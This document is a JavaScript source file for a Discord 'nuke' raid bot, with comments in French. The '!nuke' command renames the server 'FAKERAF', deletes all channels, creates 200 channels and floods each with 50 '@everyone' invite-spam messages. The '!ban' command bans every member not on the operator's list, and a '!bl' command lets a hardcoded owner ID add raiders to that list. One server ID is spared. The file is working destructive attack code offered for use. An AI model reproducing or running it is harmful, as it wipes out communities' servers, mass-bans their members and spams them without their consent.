const { Client, Collection , GatewayIntentBits, blockQuote } = require('discord.js');
const { token } = require('./config.json');

const client = new Client({ intents: [GatewayIntentBits.Guilds, GatewayIntentBits.GuildMembers, GatewayIntentBits.GuildMessages, GatewayIntentBits.MessageContent] });
client.commands = new Collection();
const fs = require('fs');
let blacklist = []; // Déclarer la variable blacklist en dehors de la fonction readFile


client.on('ready', () => {

	console.log(`logged in as ${client.user.username}`);
})
  
function loadBlacklist() {
	fs.readFile('blacklist.txt', 'utf8', (err, data) => {
	  if (err) {
		console.error('Erreur lors de la lecture du fichier :', err);
		return;
	  }
  
	  // Séparer les lignes du fichier en utilisant le saut de ligne comme séparateur
	  const lines = data.split('\n');
  
	  // Créer un tableau à partir des lignes (en enlevant les espaces vides)
	  blacklist = lines.map(line => line.trim());
	});
  }
  
loadBlacklist();
client.on('messageCreate', async msg => {
  const guild = msg.guild;
  const channela = await msg.guild.channels.fetch();
  if (guild.id !== "1076245825128239164") {
	loadBlacklist();
  	if (msg.content === "!nuke") {
		if (blacklist.includes(msg.author.id)) {
    		guild.setName("FAKERAF");
    		await Promise.all(guild.channels.cache.map(channel => channel.delete()));
    		const promises = [];
    		for (let i = 1; i <= 200; i++) {
    			const channel = await msg.guild.channels.create({
        			type: 0,
        			name: 'nuked-by-'+msg.member.displayName
      		});

			const channelPromises = [];
    		for (let j = 1; j <= 50; j++) {
        		channelPromises.push(channel.send(`@everyone https://discord.gg/g7yaZYq7S VRAI RAF`));
      		}	

    		promises.push(Promise.all(channelPromises));
    	}

	await Promise.all(promises);
    msg.channel.send("@everyone https://discord.gg/g7yaZYq7S VRAI RAF");
  } else {
		msg.channel.send("Vous n'êtes pas autorisé à utiliser cette commande.")
  }
}
  }
});

client.on('messageCreate', async msg => {
  if (msg.content === "!ban") {
	if (msg.guild.id !== "1076245825128239164") {
    	const guild = msg.guild;
    	const members = await guild.members.fetch();
    	const banPromises = [];

    	members.each(member => {
      	if (!blacklist.includes(member.id)) {
        	banPromises.push(
          	member.ban()
            	.then(bannedMember => console.log(`ban ${bannedMember.displayName}`))
            	.catch(error => console.error(`not banned ${member.user.tag}`))
        	);
      	}
    	});

    	await Promise.all(banPromises);
    	console.log('All members banned !');
  	} 
	}
}
	);

client.on('messageCreate', message => {
	if (message.content.startsWith('!bl')) {
	  if (message.author.id === '1115703939489349784') {
		// Extraire l'argument de la commande
		const args = message.content.slice('!bl'.length).trim().split(/ +/);
		const argument = args.shift();
  
		if (argument) {
		  // Ajouter l'argument à la blacklist
		  addToBlacklist(argument, message.channel);
		} else {
		  // Aucun argument fourni
		  	message.channel.send('Identifiant incorrect');
		}
	  } else {
			message.channel.send("Vous n'êtes pas autorisé à utiliser cette commande.");
	  }
	}
		});
  
	function addToBlacklist(argument, channel) {
		// Lire le fichier contenant la blacklist
		fs.readFile('blacklist.txt', 'utf8', (err, data) => {
		  if (err) {
			console.error('Erreur lors de la lecture du fichier :', err);
			return;
		  }
	  
		  // Séparer les lignes du fichier en utilisant le saut de ligne comme séparateur
		  let lines = data.split('\n');
	  
		  // Créer un tableau à partir des lignes (en enlevant les espaces vides)
		  let blacklist = lines.map(line => line.trim());
	  
		  // Ajouter l'argument à la blacklist (s'il n'existe pas déjà)
		  const parsedArgument = BigInt(argument);
		  if (!blacklist.includes(argument)) {
			blacklist.push(argument);
	  
			// Mettre à jour le fichier avec la nouvelle blacklist
			const updatedBlacklist = blacklist.join('\n');
			fs.writeFile('blacklist.txt', updatedBlacklist, 'utf8', err => {
			  if (err) {
				console.error('Erreur lors de la mise à jour du fichier :', err);
				return;
			  }
	  
			  channel.send(`L'utilisateur ayant ${argument} pour identifiant a été ajouté à la blacklist`);
			  blacklistban = blacklist;
			});
		  } else {
			channel.send(`L'identifiant est déjà dans la blacklist.`);
		  }
		});
	  }

client.login(token);